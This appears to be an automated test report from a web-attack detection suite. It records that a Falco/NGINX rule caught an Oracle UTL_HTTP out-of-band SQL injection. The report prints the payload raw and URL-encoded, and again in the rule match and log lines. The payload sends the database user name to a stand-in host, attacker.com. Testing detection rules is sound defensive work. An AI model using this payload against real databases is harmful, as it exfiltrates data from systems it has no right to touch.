name: test_e2e_with_logs[081_SQLI_OOB_001]
description:
## Attack Pattern Information

| Item | Value |
|------|-------|
| **Pattern ID** | `SQLI_OOB_001` |
| **Name** | Oracle UTL_HTTP OOB Exfiltration |
| **Category** | SQLI |
| **Subcategory** | out_of_band |
| **Severity** | `CRITICAL` |

## Attack Details

- **Payload**: `' AND UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--`
- **Encoded**: `'%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))--`
- **Expected Detection**: Yes

## Test Execution Results

- **Status**: `PASSED`
- **Detection Count**: 1 / 1
- **Latency**: ~38000ms
- **Timestamp**: 13:36:15.000 UTC

## Rule Mapping

| Item | Value |
|------|-------|
| **Expected Rule** | `[NGINX SQLi] Error-based SQL Injection` |
| **Matched Rule** | `[NGINX SQLi] Error-based SQL Injection test_id=SQLI_OOB_001-1771076175950-98h439 pattern_id=SQLI_OOB_001 uri=/?q='%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))-- client=127.0.0.1 method=GET` |
| **Rule Match** | ✅ Match |

## Detection Evidence

**Rule Name**: [NGINX SQLi] Error-based SQL Injection test_id=SQLI_OOB_001-1771076175950-98h439 pattern_id=SQLI_OOB_001 uri=/?q='%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))-- client=127.0.0.1 method=GET

**Falco Log Entry**:
```
13:36:15.000000000: Critical [NGINX SQLi] Error-based SQL Injection test_id=SQLI_OOB_001-1771076175950-98h439 pattern_id=SQLI_OOB_001 uri=/?q='%20AND%20UTL_HTTP.REQUEST('http%3A%2F%2Fattacker.com%2F'%7C%7C(SELECT%20user%20FROM%20dual))-- client=127.0.0.1 method=GET
```
